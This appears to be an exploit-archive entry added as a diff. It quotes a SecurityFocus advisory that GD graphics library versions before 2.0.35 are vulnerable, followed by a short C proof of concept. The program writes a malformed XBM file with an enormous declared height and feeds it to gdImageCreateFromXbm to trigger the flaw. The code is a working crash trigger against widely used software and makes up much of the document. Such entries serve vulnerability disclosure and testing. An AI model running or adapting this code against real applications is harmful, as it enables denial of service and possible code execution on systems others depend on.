@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/24651/info
+
+The GD graphics library is prone to multiple vulnerabilities.
+
+An attacker can exploit this issue to cause denial-of-service conditions or execute arbitrary code in the context of applications implementing the affected library.
+
+Version prior to GD graphics library 2.0.35 are reported vulnerable. 
+
+#include "gd.h"
+
+int main() {
+    FILE *fp = fopen("./x.xbm", "w+");
+
+    fprintf(fp, "#define width 255\n#define height 1073741824\nstatic unsigned char bla = {\n");
+
+    fseek(fp, 0, SEEK_SET);
+
+    gdImageCreateFromXbm(fp);
+
+}
